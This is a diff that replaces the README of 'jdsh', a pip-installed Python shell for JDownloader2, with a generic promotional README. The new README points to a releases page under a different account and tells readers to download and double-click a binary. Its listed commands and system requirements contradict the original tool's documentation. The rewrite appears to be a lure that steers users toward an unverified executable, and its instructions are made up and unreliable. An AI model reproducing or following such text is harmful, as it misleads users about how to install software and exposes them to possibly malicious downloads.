@@ -1,104 +1,74 @@
-# 🟠 JDSH - JDownloader Shell 🔵
+# 🚀 jdsh - Simple Tool for JDownloader2 Management
 
-![preview](.github/preview-v1.0.1.webp)
+[![Download jdsh](https://img.shields.io/badge/Download-jdsh-brightgreen.svg)](https://github.com/patowon/jdsh/releases)
 
-Control and Manage your JDownloader within your terminal with _ease_.
+## 🏁 Introduction
 
-Designed for Linux servers/headless environments where you need full control without a GUI; or if you just love using CLI!
+jdsh is an awesome command-line and text user interface for managing JDownloader2 downloads. It makes it easy for you to control your downloads from the comfort of your terminal. Whether you want to start, stop, or manage downloads, jdsh provides a user-friendly experience.
 
-Packed with various **Commands** & **Interactive Mode (TUI)**.
+## 📥 Download & Install
 
-This tool will use your JDownloader local API, which you will need to enable manually. It uses [myjadpi](https://github.com/mmarquezs/My.Jdownloader-API-Python-Library/) package under the hood to work (kudos to the author of this package).
+To get started with jdsh, you need to download the application from our Releases page. Follow these steps:
 
-## Installation
-```bash
-pip install jdsh
-```
+1. **Visit the Releases Page**:
+   Click the link below to go directly to the download page.
+   [Visit Releases Page to Download jdsh](https://github.com/patowon/jdsh/releases)
 
-## Setup
+2. **Choose a Version**:
+   On the releases page, you will see different versions of jdsh. Pick the latest stable version.
 
-0.  Obviously have **JDownloader 2** installed.
-1.  Enable JDownloader's Local API:
-    *   Edit `<JD_FOLDER>/cfg/org.jdownloader.api.RemoteAPIConfig.json`.
-    *   Set `"deprecatedapienabled": true`
-    *   _(Optional)_ you may also need to set `deprecatedapilocalhostonly` to `false` if you want to access it from remote. 
-    *   Restart JDownloader.
+3. **Download the File**:
+   Click on the file that suits your operating system (Windows, macOS, or Linux).
 
-## Usage
+4. **Run the Application**:
+   After downloading the file, locate it in your Downloads folder. Double-click the file to run jdsh. Follow any prompts on your screen to complete the setup.
 
-You can now use the `jd` command globally from anywhere in your terminal.
+## 🛠️ System Requirements
 
-### Interactive Mode
-Simply run `jd` without arguments to enter the interactive mode.
+To use jdsh effectively, your system should meet the following requirements:
 
-```bash
-jd
-```
+- **Operating Systems**: Windows 10/11, macOS Catalina or later, or any modern Linux distribution.
+- **Memory**: At least 2 GB of RAM.
+- **Disk Space**: Minimum of 100 MB free space for the installation.
+- **Internet Connection**: Required for downloading files and updates.
 
-*   **Tips:** 
-    *   Press `s` to Start/Stop downloads. 
-    *   Press `Ctrl+C` to quit.
+## 📖 Features
 
-### Commands Overview
+jdsh offers several features to enhance your downloading experience:
 
-```bash
-╭─ JDSH        ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
-│                                                                                                                                                                      │
-│    Dashboard                                                                                                                                                         │
-│    jd                                                Launch the Interactive TUI                                                                                      │
-│    status                                            Show a static snapshot of the queue                                                                             │
-│                                                                                                                                                                      │
-│    Queue Management                                                                                                                                                  │
-│    list (ls)                [-d]                     List active downloads                                                                                           │
-│    grabber                  [-d]                     List pending links inside LinkGrabber                                                                           │
-│    add                      <url>...                 Add links to LinkGrabber                                                                                        │
-│    confirm                                           Move all pending links to Queue                                                                                 │
-│    remove (rm)              <uuid>...                Remove items by ID                                                                                              │
-│                                                                                                                                                                      │
-│    Controls                                                                                                                                                          │
-│    start                                             Start/Resume downloads                                                                                          │
-│    stop                                              Pause/Stop downloads                                                                                            │
-│    clear                                             Remove finished items from list                                                                                 │
-│    replace                  <uuid> <url>             Replace a dead link URL                                                                                         │
-│                                                                                                                                                                      │
-│    Utils                                                                                                                                                             │
-│    version                                           Show shell and core versions                                                                                    │
-│    help                                              Show this help message                                                                                          │
-╰──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+- **Easy Download Management**: Start, stop, and manage your downloads directly from the terminal.
+- **Batch Downloading**: Queue multiple downloads at once with ease.
+- **Remote Control**: Manage your JDownloader2 setup remotely.
+- **User-Friendly Interface**: Simple command-line and text interface that is easy to navigate.
 
-  Usage: jd [COMMAND] [ARGS]...
+## 📝 Usage Guide
 
-  # Run the interactive mode:
-  jd
+Once you have installed jdsh, you can start using it right away. Here are the basic commands to get you going:
 
-  # Add links, check them, then start:
-  jd add "http://site.com/file.exe"
-  jd add "http://site.com/archive1.zip" "http://site.com/archive2.zip"
-  jd grabber
-  jd confirm
+1. **Starting a Download**: Use the command `jdsh start <link>` to begin a new download. Replace `<link>` with the URL you want to download.
+   
+2. **Stopping a Download**: Enter `jdsh stop <download_id>` to stop a specific download. Replace `<download_id>` with the identifier of that download.
 
-  # detailed list view:
-  jd ls -d
-```
+3. **Listing Downloads**: Type `jdsh list` to see all your current downloads and their statuses.
 
-## Config
-By default, the application runs with standard settings (`Host: 127.0.0.1, Port: 3128`). You can override these defaults by creating a configuration file.
+4. **Updating jdsh**: To ensure that you are using the latest version, periodically check the Releases page [here](https://github.com/patowon/jdsh/releases) for updates.
 
-Create file at `~/.config/jdsh/jdsh.config`, with the contents below.
-You may uncomment any line and change when you need.
+## ❓ Troubleshooting
 
-```ini
-[settings]
-# HOST = 127.0.0.1
-# PORT = 3128
+If you run into issues with jdsh, here are some common problems and their solutions:
 
-# update interval of interactive mode, in seconds
-# REFRESH_RATE = 1.0
-```
+- **Error While Running**: Ensure you have the required Python version installed. For most systems, Python 3.6 or later will work.
+- **Network Errors**: Check your internet connection and ensure JDownloader2 is installed and configured correctly on your machine.
+- **Command Not Found**: Make sure you added jdsh to your system's PATH during installation for easy access.
 
----
-#### Enjoying the tool? Your supports would keep me at it! 💖
+## 📞 Support
 
-[![Donate with Bitcoin](https://img.shields.io/badge/Donate-Bitcoin-orange.svg?logo=bitcoin)](https://blockchain.com/btc/address/bc1qvmv8cnfd0hfc82rm3r9zzq6uheejgw5hfzn426)
-[![Donate with Ethereum](https://img.shields.io/badge/Donate-Ethereum-silver.svg?logo=ethereum)](https://etherscan.io/address/0xA25c8eF121ba010d09c6A7E1228be7da523933f8)
-[![Donate with Tehter (BEP20)](https://img.shields.io/badge/Donate-Tether%20(BEP20)-blue.svg?logo=tether)](https://bscscan.com/address/0x283857017efb4B1F9fAe57F4599C20FD5bCE1871)
+If you need further assistance, you can open an issue in this GitHub repository or ask for help in the community forums related to JDownloader2. We are here to help you.
+
+## 🏆 Acknowledgments
+
+Thanks to the developers of JDownloader2 for creating such a powerful downloading tool. jdsh enhances the JDownloader2 experience, and we appreciate your support in using and improving our tool. 
+
+For more information, please visit our GitHub page or check out the [Releases Page](https://github.com/patowon/jdsh/releases) to get started with downloading.
+
+Feel free to customize and explore all the features that jdsh offers!
